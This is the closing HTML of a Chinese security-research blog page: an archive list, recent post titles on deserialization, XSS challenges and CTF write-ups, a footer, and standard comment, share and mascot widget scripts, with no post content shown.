      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
